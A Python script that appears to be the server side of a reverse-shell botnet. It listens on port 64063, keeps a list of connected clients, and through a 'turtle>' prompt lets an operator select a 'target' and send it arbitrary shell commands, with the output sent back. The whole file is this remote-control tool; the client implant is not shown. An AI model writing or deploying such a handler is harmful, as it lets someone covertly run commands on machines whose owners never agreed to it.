import socket
import sys
import threading
import time
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]

queue = Queue()
all_connections = []
all_address = []





#one end of of nection
def create_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 64063
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error" + str(msg))

#binds socket and listens connection
def bind_socket():
    try:
        global host
        global port
        global s

        s.bind((host,port))

        s.listen(5)

    except socket.error as msg:
        print("Socket binding error" + str(msg)+ "\n" + "Retrying....")
        bind_socket()



#Thread1
#handling connections from multiple clients and saving to a list
#closing pervious connections when server.py file is restarted
def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:

        try:
            conn,address = s.accept()
            s.setblocking(1)    #prevents timeout

            all_connections.append(conn)
            all_address.append(address)

            time.sleep(5)
        except:
            print("Error accepting connections")


#Thread2
#Sees all clients
#Select a clients
#Sends commands
#Interactive prompt for sending commands
def start_turtle():

    while (True):
        cmd = input('turtle>')
        if(0<len(cmd)):
            if(cmd == "list"):
                list_connections()
            elif ("select" in cmd):
                conn = get_target(cmd)
                if(conn is not None):
                    send_target_commands(conn)
            else:
                print("Command unrecognized")


#Display all current active connections with the clients
def list_connections():
    result = ""

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        result = str(i)+" " + str(all_address[i][0])+ " " + str(all_address[i][1])+"\n"

    print("------Clients--------" + "\n\n" + result)


def get_target(cmd):
    try:
        target = cmd.replace('select ', "")
        target = int(target)
        conn = all_connections[target]
        print("You're now connected to: " + str(all_address[target][0]))
        #print(str(all_address[target][0])+ ">", end ="")
        return conn

    except:
        print("Selection not valid")
        return None


def send_target_commands(conn):

    hostname = conn.getpeername()[0]
    cwd = ""
    while(True):
        try:
            print(hostname+cwd+">",end="")
            cmd = input()

            if(0<len(cmd)):
                if(cmd=="quit"):
                    break

                if (0<len(str.encode(cmd))):
                    conn.send(str.encode(cmd))

                    client_response = str(conn.recv(20480),"utf-8").rpartition("\n\n")
                    output = client_response[0]
                    cwd = "||"+client_response[2][:-1]
                    print(output)

        except:
            print("Error sending commands")
            break



def create_workers():

    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, daemon=True)
        t.start()



#Do next job that is in the queue(handle connections, send commands)
def work():
    while(True):
        x = queue.get()

        if(x==1):
            create_socket()
            bind_socket()
            accepting_connection()

        if(x==2):
            start_turtle()

        queue.task_done()



def create_jobs():
    for i in JOB_NUMBER:
        queue.put(i)

    queue.join()
    print("<------BREAK------>")




create_workers()
create_jobs()
